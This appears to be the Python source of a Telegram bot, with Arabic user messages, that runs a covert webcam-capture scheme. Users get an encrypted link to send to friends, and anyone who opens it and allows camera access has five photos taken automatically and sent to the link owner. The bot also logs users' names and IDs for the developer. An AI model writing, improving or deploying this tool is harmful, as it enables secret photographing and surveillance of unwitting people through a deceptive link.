import time
from datetime import datetime
import telebot
from config import TOKEN, DEVELOPER_CHAT_ID, BASE_URL, logger, load_data, save_data
from encryption import encrypt_id

bot = telebot.TeleBot(TOKEN)

# تحميل البيانات
data = load_data()
user_stats = data.get("user_stats", {})
total_photos_received = data.get("total_photos_received", 0)

# تحديث وقت بدء البوت إذا كان أول مرة
if not data.get("first_start"):
    data["first_start"] = datetime.now().isoformat()
    save_data(data)

def save_user_data():
    """حفظ بيانات المستخدمين"""
    data["user_stats"] = user_stats
    data["total_photos_received"] = total_photos_received
    data["total_users"] = len(user_stats)
    save_data(data)

def notify_developer(message_text, parse_mode="Markdown"):
    """إرسال إشعار للمطور"""
    try:
        bot.send_message(DEVELOPER_CHAT_ID, message_text, parse_mode=parse_mode)
    except Exception as e:
        logger.error(f"Failed to notify developer: {e}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    """رسالة الترحيب"""
    user_id = message.chat.id
    user_name = message.from_user.first_name
    username = message.from_user.username or "لا يوجد"
    is_new_user = False

    # تسجيل المستخدم الجديد
    if user_id not in user_stats:
        is_new_user = True
        user_stats[user_id] = {
            "name": user_name,
            "username": username,
            "photo_count": 0,
            "first_seen": datetime.now().isoformat(),
            "last_active": datetime.now().isoformat(),
            "total_links_shared": 0
        }
        save_user_data()
        
        # إشعار للمطور بمستخدم جديد
        notify_message = (
            f"🆕 *مستخدم جديد!*\n\n"
            f"👤 الاسم: {user_name}\n"
            f"🆔 المعرف: `{user_id}`\n"
            f"📝 اليوزر: @{username}\n"
            f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"👥 إجمالي المستخدمين: {len(user_stats)}"
        )
        notify_developer(notify_message)
    else:
        user_stats[user_id]["last_active"] = datetime.now().isoformat()
        user_stats[user_id]["name"] = user_name
        user_stats[user_id]["username"] = username
        save_user_data()

    # تشفير الـ ID
    encrypted = encrypt_id(user_id)
    personal_link = f"{BASE_URL}?q={encrypted}"

    # زيادة عدد مشاركات الرابط
    user_stats[user_id]["total_links_shared"] = user_stats[user_id].get("total_links_shared", 0) + 1
    save_user_data()

    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton(text="📸 افتح الكاميرا الآن", url=personal_link))
    markup.add(
        telebot.types.InlineKeyboardButton(text="❓ التعليمات", callback_data="help"),
        telebot.types.InlineKeyboardButton(text="📊 إحصائياتي", callback_data="stats")
    )

    response = (
        f"🎉 أهلاً بك *{user_name}*!\n\n"
        f"✨ هذا هو *رابطك الشخصي* للكاميرا الذكية:\n"
        f"`{personal_link}`\n\n"
        f"📌 *طريقة الاستخدام:*\n"
        f"1. انسخ الرابط أعلاه\n"
        f"2. أرسله لأصدقائك\n"
        f"3. أي شخص يفتح الرابط ويعمل اذن الوصول الى الكاميرا ستصل صورته إليك فوراً!\n\n"
        f"🔒 *ملاحظة:* الرابط مشفر بالكامل، لا يمكن لأحد معرفة الرقم الأصلي"
    )
    bot.send_message(user_id, response, parse_mode="Markdown", reply_markup=markup)
    logger.info(f"User started: {user_name} (ID: {user_id}) - New: {is_new_user}")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    """عرض الإحصائيات"""
    user_id = message.chat.id
    if user_id in user_stats:
        stat = user_stats[user_id]
        # تحويل التواريخ
        first_seen = datetime.fromisoformat(stat['first_seen']) if isinstance(stat['first_seen'], str) else stat['first_seen']
        last_active = datetime.fromisoformat(stat['last_active']) if isinstance(stat['last_active'], str) else stat['last_active']
        
        response = (
            f"📊 *إحصائياتك الشخصية*\n\n"
            f"👤 الاسم: {stat['name']}\n"
            f"🆔 رقمك: `{user_id}`\n"
            f"📸 عدد الصور المستلمة: {stat['photo_count']}\n"
            f"🔗 عدد مرات مشاركة رابطك: {stat.get('total_links_shared', 0)}\n"
            f"📅 تاريخ التسجيل: {first_seen.strftime('%Y-%m-%d %H:%M')}\n"
            f"🕐 آخر نشاط: {last_active.strftime('%Y-%m-%d %H:%M')}\n\n"
            f"🌐 *إحصائيات عامة:*\n"
            f"👥 عدد المستخدمين: {len(user_stats)}\n"
            f"🖼️ إجمالي الصور: {total_photos_received}"
        )
    else:
        response = "❌ لم يتم العثور على إحصائيات لك. استخدم /start أولاً"
    bot.send_message(user_id, response, parse_mode="Markdown")

@bot.message_handler(commands=['adminstats'])
def admin_stats(message):
    """إحصائيات المطور (للمطور فقط)"""
    if message.chat.id != DEVELOPER_CHAT_ID:
        bot.reply_to(message, "❌ هذا الأمر للمطور فقط!")
        return
    
    # حساب إحصائيات إضافية
    total_users = len(user_stats)
    total_photos = total_photos_received
    active_users = sum(1 for u in user_stats.values() if 
                       datetime.fromisoformat(u['last_active']) > datetime.now().replace(hour=0, minute=0, second=0))
    
    # المستخدمين النشطين في آخر 7 أيام
    week_ago = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
    week_active = sum(1 for u in user_stats.values() if 
                      datetime.fromisoformat(u['last_active']) > week_ago)
    
    # أكثر المستخدمين نشاطاً
    top_users = sorted(user_stats.items(), key=lambda x: x[1].get('photo_count', 0), reverse=True)[:5]
    top_users_text = ""
    for i, (uid, stat) in enumerate(top_users, 1):
        top_users_text += f"{i}. {stat['name']} - {stat.get('photo_count', 0)} صورة\n"
    
    # وقت بدء البوت
    first_start = datetime.fromisoformat(data.get("first_start", datetime.now().isoformat()))
    
    response = (
        f"📊 *إحصائيات البوت الكاملة*\n\n"
        f"👥 *إجمالي المستخدمين:* {total_users}\n"
        f"🖼️ *إجمالي الصور:* {total_photos}\n"
        f"⭐ *المستخدمين النشطين اليوم:* {active_users}\n"
        f"📅 *المستخدمين النشطين آخر 7 أيام:* {week_active}\n\n"
        f"🏆 *أكثر المستخدمين نشاطاً:*\n{top_users_text}\n"
        f"📅 *تاريخ بدء البوت:* {first_start.strftime('%Y-%m-%d %H:%M')}\n"
        f"🕐 *آخر تحديث:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    bot.send_message(DEVELOPER_CHAT_ID, response, parse_mode="Markdown")

@bot.message_handler(commands=['help'])
def send_help(message):
    """رسالة المساعدة"""
    help_text = (
        "📖 *دليل استخدام البوت*\n\n"
        "🎯 *الأوامر المتاحة:*\n"
        "✅ /start - الحصول على رابطك الشخصي\n"
        "📊 /stats - عرض إحصائياتك\n"
        "❓ /help - عرض هذه التعليمات\n"
        "📈 /adminstats - إحصائيات البوت (للمطور فقط)\n\n"
        "🔧 *كيف يعمل البوت:*\n"
        "1. اضغط على /start للحصول على رابطك الشخصي\n"
        "2. أرسل الرابط لأصدقائك\n"
        "3. عندما يفتحون الرابط، سيتم تحميل كاميرا الويب\n"
        "4. يتم التقاط 5 صور تلقائياً (صورة كل 2 ثانية)\n"
        "5. تصل الصور إليك مباشرة في هذه المحادثة\n\n"
        "⚠️ *ملاحظات هامة:*\n"
        "• البوت يأخذ 5 صور فقط ثم يتوقف\n"
        "• يمكن إعادة فتح الرابط لالتقاط المزيد\n"
        "• الصور تصل فقط لصاحب الرابط\n\n"
        "🛠️ للمساعدة التقنية: @khaled_developer"
    )
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    """إرسال رسالة لجميع المستخدمين (للمطور فقط)"""
    if message.chat.id != DEVELOPER_CHAT_ID:
        bot.reply_to(message, "❌ هذا الأمر للمطور فقط!")
        return

    parts = message.text.split(' ', 1)
    if len(parts) < 2:
        bot.reply_to(message, "❌ استخدم:\n/broadcast نص الرسالة")
        return

    broadcast_text = parts[1]
    success, fail = 0, 0
    
    for uid in user_stats.keys():
        try:
            bot.send_message(uid, f"📢 *إشعار من المطور:*\n\n{broadcast_text}", parse_mode="Markdown")
            success += 1
            time.sleep(0.1)
        except Exception as e:
            logger.error(f"Failed to send to {uid}: {e}")
            fail += 1
    
    bot.reply_to(message, f"✅ تم البث!\n✓ {success} مستخدم\n✗ {fail} فشل")
    
    # إشعار للمطور بنتيجة البث
    notify_developer(f"📢 *نتيجة البث*\n\n✓ نجح: {success}\n✗ فشل: {fail}")

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    """معالجة الصور الواردة"""
    global total_photos_received
    user_id = message.chat.id
    user_name = message.from_user.first_name
    username = message.from_user.username or "لا يوجد"

    if user_id in user_stats:
        user_stats[user_id]["photo_count"] += 1
        user_stats[user_id]["last_active"] = datetime.now().isoformat()
    else:
        user_stats[user_id] = {
            "name": user_name,
            "username": username,
            "photo_count": 1,
            "first_seen": datetime.now().isoformat(),
            "last_active": datetime.now().isoformat(),
            "total_links_shared": 0
        }
        save_user_data()
    
    total_photos_received += 1
    save_user_data()

    photo = message.photo[-1]
    file_info = bot.get_file(photo.file_id)
    file_size = file_info.file_size / 1024

    caption = (
        f"✅ تم استلام صورة جديدة!\n\n"
        f"👤 من: {user_name}\n"
        f"🆔 المعرف: `{user_id}`\n"
        f"📝 اليوزر: @{username}\n"
        f"📏 الحجم: {file_size:.1f} كيلوبايت\n"
        f"🖼️ إجمالي صورك: {user_stats[user_id]['photo_count']}\n"
        f"📊 الإجمالي الكلي: {total_photos_received}"
    )
    bot.reply_to(message, caption)
    logger.info(f"Received photo from {user_name} (ID: {user_id})")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    """معالجة الأزرار"""
    if call.data == "help":
        send_help(call.message)
    elif call.data == "stats":
        show_stats(call.message)
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """معالجة الرسائل الأخرى"""
    if message.text and message.text.startswith('/'):
        bot.reply_to(message, "❌ أمر غير معروف!\n\n✅ الأوامر المتاحة:\n/start - للحصول على رابطك\n/stats - لعرض إحصائياتك\n/help - للتعليمات والمساعدة")
    else:
        bot.reply_to(message, f"مرحباً {message.from_user.first_name}! 👋\n\nاستخدم /start للحصول على رابطك الشخصي.")

def get_bot():
    """إرجاع كائن البوت والإحصائيات"""
    return bot, user_stats, total_photos_received
